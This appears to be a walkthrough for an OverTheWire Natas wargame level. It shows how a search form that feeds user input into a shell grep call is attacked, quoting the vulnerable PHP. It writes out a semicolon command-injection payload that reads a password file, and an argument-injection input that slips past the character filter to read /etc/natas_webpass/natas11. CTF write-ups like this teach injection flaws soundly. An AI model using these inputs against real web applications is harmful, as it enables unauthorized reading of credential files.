# OverTheWire Natas Walkthrough: Level 9 → Level 10

## Challenge Description
The goal of Level 10 is to exploit a vulnerability in the search form to retrieve the password for Level 11.

* **URL:** http://natas10.natas.labs.overthewire.org
* **Username:** natas10

---

## Walkthrough

### 1. Analyzing the Interface
Upon logging in, we are presented with a simple search form that looks for words in a dictionary:
``` text
For security reasons, we now filter on certain characters
Find Words Containing: [_______________] Search
Output:                                             view source code
```

### 2. Steps
We try to do what we did previously so.
we input
```bash
; cat /etc/natas_webpass/natas10 #
```
But this time we get
```text
 preg_match(): Allocation of JIT memory failed, PCRE JIT will be disabled. This is likely caused by security restrictions. Either grant PHP permission to allocate executable memory, or set pcre.jit=0 in /var/www/natas/natas10/index.php on line 31

Input contains an illegal character!
```
On seeing the source code we find 
```html
.
.
if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
.
.
```
This implies any of the texts in preg_match will yeild illegal character
So, now we'll have to work around it
### 3. Exploitation
We can use Grep's commands to work around 
we input
```text
 . cat /etc/natas_webpass/natas11
```
Now, we get a list of strings, where we can find natas 11's password

